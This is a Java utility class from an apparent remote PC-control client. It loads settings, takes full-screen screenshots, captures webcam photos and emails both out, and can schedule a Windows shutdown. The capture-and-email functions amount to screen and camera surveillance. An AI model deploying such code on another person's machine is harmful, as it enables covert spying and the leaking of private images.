package pokerface.Sad.util;

import java.awt.AWTException;
import java.awt.Dimension;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Properties;

import javax.imageio.ImageIO;

import org.apache.commons.mail.EmailException;

import com.github.sarxos.webcam.Webcam;
import com.github.sarxos.webcam.WebcamPanel;
import com.github.sarxos.webcam.WebcamResolution;
import com.github.sarxos.webcam.WebcamUtils;
import com.github.sarxos.webcam.util.ImageUtils;

import pokerface.Sad.mail.MailUtil;


public class Util {
	//获取配置文件
	public static Properties getProperties() throws FileNotFoundException, IOException{
		Properties pro = new Properties();
		pro.load(new FileInputStream("PCClient.properties"));
		return pro;
	}
	//获取当前时间
	public static String getDate() throws FileNotFoundException, IOException {
		Properties pro = null;
		String date = null;
		pro = getProperties();
		Date d = new Date();
		SimpleDateFormat sdf = new SimpleDateFormat(pro.getProperty("dateFormat"));
		date = sdf.format(d);
		return date;
	}
	//截图
	public static void screenShot() throws IOException, AWTException, EmailException {
			Properties pro = getProperties();
			String filePath = pro.getProperty("RobotWorkPlace")+"PrtSc/screen.jpg";
			Dimension dim = Toolkit.getDefaultToolkit().getScreenSize();
			BufferedImage bim = new Robot().createScreenCapture(new Rectangle(
					0, 0, dim.width, dim.height));
			ImageIO.write(bim, "jpg", new File(filePath));
			//邮件发送截图
			MailUtil.sendPic("ScreenShot", filePath);
	}

	//关机
	public static void shutdown() throws IOException, AWTException, EmailException{
		Runtime.getRuntime().exec("shutdown -s -t 60");
		screenShot();
	}
	//摄像头拍照
	public static void takePicture() throws FileNotFoundException, IOException, EmailException {
		Webcam webcam = null;
		String filePath = null;
		try{
		Properties pro = getProperties();
		filePath = pro.getProperty("RobotWorkPlace")+"CamPic/Pic";
		webcam = Webcam.getDefault();
        webcam.setViewSize(WebcamResolution.VGA.getSize());
        WebcamPanel panel = new WebcamPanel(webcam);
        panel.setFPSDisplayed(true);
        panel.setDisplayDebugInfo(true);
        panel.setImageSizeDisplayed(true);
        panel.setMirrored(true);
        WebcamUtils.capture(webcam, filePath, ImageUtils.FORMAT_PNG);
		}finally{
			webcam.close();
		}
        MailUtil.sendPic("Camera", filePath+".png");
	}
}
